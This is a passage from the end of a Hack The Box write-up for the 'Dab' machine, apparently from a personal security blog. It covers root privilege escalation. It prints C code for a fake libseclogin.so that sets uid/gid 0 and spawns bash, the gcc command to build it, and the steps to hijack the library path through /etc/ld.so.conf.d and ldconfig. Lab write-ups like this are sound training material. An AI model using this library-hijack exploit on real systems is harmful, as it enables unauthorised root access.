<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="n">seclogin</span><span class="p">()</span> <span class="p">{</span>
<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/dab/52.png" alt="" class="align-center"><br><br>
After that we will compile it 
<code class="language-plaintext highlighter-rouge">gcc -fPIC -shared -o libseclogin.so exploit.c</code>
Now our fake <code class="language-plaintext highlighter-rouge">libseclogin.so</code> is ready , we need to make the system point to our path <code class="language-plaintext highlighter-rouge">/home/genevieve/.exploit/libseclogin.so</code> instead of <code class="language-plaintext highlighter-rouge">/usr/lib/libseclogin.so</code>
We will <code class="language-plaintext highlighter-rouge">cd</code> to <code class="language-plaintext highlighter-rouge">/etc/ld.so.conf.d</code> , and create a <code class="language-plaintext highlighter-rouge">.conf</code> file and put our path in it.<br>
<br><img src="/images/hackthebox/dab/53.png" alt="" class="align-center"><br><br>
Then to activate that path we will execute this command <code class="language-plaintext highlighter-rouge">ldconfig</code>
<a href="https://www.cyberciti.biz/faq/linux-setting-changing-library-path/" target="_blank" rel="noopener noreferrer">This page</a> helped a lot.<br>
Let’s do <code class="language-plaintext highlighter-rouge">ldd</code> again:
<br><img src="/images/hackthebox/dab/54.png" alt="" class="align-center"><br><br>
The path changed and pointed to our fake library.<br>
Let’s own root.<br>
<code class="language-plaintext highlighter-rouge">./myexec</code>
<br><img src="/images/hackthebox/dab/55.png" alt="" class="align-center"><br><br>
And we owned root.<br></p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/secnotes/">Hack The Box - Secnotes</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/ypuffy/">Hack The Box - Ypuffy</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-02-02T07:00:00+02:00">February 2, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/lists/stego/" class="pagination--pager" title="Steganography - A list of useful tools and resources
">Previous</a>
    
    
      <a href="/hack-the-box/ypuffy/" class="pagination--pager" title="Hack The Box - Ypuffy
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
